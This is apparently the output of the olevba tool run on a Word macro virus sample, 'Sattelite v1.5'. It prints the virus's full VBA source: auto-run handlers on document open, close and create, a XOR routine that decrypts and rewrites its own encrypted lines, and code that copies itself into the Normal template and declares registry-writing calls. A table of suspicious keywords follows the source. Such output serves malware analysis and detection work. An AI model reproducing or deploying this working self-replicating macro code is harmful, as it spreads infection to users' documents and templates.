olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sattelite.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sattelite.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































































































































Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Const REG_SZ As Long = 1
Const HKEY_CURRENT_USER As Long = &H80000001
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Private Sub Document_New()
Call Document_Open
End Sub
'Sattelite v1.5
'Document
Private Function encr(s, k As Integer)
Dim r: r = "": For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next: encr = r
End Function
Private Sub Document_Open()
On Error Resume Next: W = 0: CH = Word.ActiveDocument.Characters.Count: Kar = "'" + Str(CH)
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(143, 1)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: .ReplaceLine 204, Kar: Z = .CountOfLines - 29: For X = 162 To Z:
If W = 20 Then W = 0
decrypt = .Lines(X, 1): W = W + 2: Y = Len(decrypt): Y = Y - 1: decrypt = Right$(decrypt, Y): .ReplaceLine X + 21, encr(decrypt, (W)): Next X: End With
Call ThisDoc: Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule: Flag = 0: GoTo over
Again: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Flag = 1
over:
With Iam: For X = 183 To 203: .ReplaceLine X, "'": Next X: End With
If Flag = 0 Then GoTo Again:
NormalTemplate.Save
End Sub
Private Sub ThisDoc()
'Ml"Gppmp"Pgqwog"Lgzv
'Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`
'Ivroihu(PotsuVtirceroih&;&@gjuc
'Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m
'Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo
'_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i
'@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&?:<".?'
'QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8!$"<0!9
'[t2GQsaw:\[;2/205ASFFW^[FW2D#<'02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw
']r4AWugq<Z]=4(*463GU@@QX]@Q4B%:!64Uzp4Z{fyWuff}qf:W{az`[rX}zqg4*4$4@|qz4Ql}`4Gav
'Kd"WAcqg*CK+"?" %QCVVGNKVG"T3,7 "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg
'Mb$QGewa,EM-$8:$&#WEPPAHMPA$R5*1&$Ej`$EgpGevvmav*GkqjpKbHmjaw$:$4$Plaj$A|mp$Wqf
'O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd
'An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz
']c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b
'[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi
'Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.?:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.?:=".,)Jam{ck`z,
'e0-0Buw_`u~[uiUhQ8X[UIO\_SQ\O]QSXY^U<02CvdgqbuL]ysbcvdLGy~tgcLSebbu~dFubcy~2<0 <0[UIOQ\\OQSSUCC<0{9
'g2/2@wuAwfDs~gwWjS:y>20@wu{afw`wv]e|w`0>2">2@WUMAH>20FzW2eW{@v2Uw\{Ga0>2#;
'a4)4FqsWx{gq_qm<=
'Glf"Ukvj"
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
' 3575
End Sub
Private Sub Document_Close()
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(143, 1): CH = Word.ActiveDocument.Characters.Count: Kar = "'" + Str(CH)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule:
Kar2 = Iam.Lines(204, 1): Iam.ReplaceLine 204, "'": NormalTemplate.Saved = True: If Kar = Kar2 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

